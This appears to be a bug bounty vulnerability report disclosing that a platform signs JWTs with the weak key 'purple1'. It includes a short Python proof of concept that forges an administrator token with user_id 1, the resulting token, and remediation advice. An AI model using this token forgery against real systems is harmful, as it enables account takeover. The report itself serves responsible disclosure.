# Description

During a security assessment on your platform, I identified a critical vulnerability that allows for account takeover. The signing key for JWTs (JSON Web Tokens) is insecure and too weak, enabling an attacker to recover it and generate valid JWTs, which allows them to become an administrator.

# Exploitation

To exploit this vulnerability, a valid JWT is required. Using a tool like `jwt_tool`, it is possible to modify this JWT and re-sign it with the key of our choice. Here, the key is "purple1". By changing our cookie in the browser, we can then become an administrator.

# PoC

Here is the content of a JWT for a regular user (which can be created).

![Normal User JWT](YWH-R303909-normal-user-jwt.png)

We can then forge a new token using a small Python script:
```python
#!/usr/bin/python

import jwt

SECRET_KEY = 'purple1'

data = {
    "token_type": "access",
    "user_id": 1
}

token = jwt.encode(data, SECRET_KEY, algorithm='HS256')
print(token)
```

This gives us the following token:
```bash
$ python3 poc_jwt.py 
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoiYWNjZXNzIiwidXNlcl9pZCI6MX0.YOa_bec4QY8jNmzaadpMA6H_eeFExYx3mwvazbwyCmU
```

By replacing the cookie, we observe that we indeed become an administrator.

![Admin JWT](YWH-R303912-jwt-admin.png)

# Risk

The main risk is that an attacker can take over any account, including administrative accounts, leading to a complete compromise of the application’s security. This can result in unauthorized data access, data manipulation, and potential further exploitation.

# Remediation

- Ensure that the signing key is strong (at least 16 to 32 characters) and not easily guessable.
- Consider using more secure signing algorithms such as RS256 or RS512.

# References

- [JWT PortSwigger](https://portswigger.net/web-security/jwt)

# Author
ESNA-ESNArcotrafiquants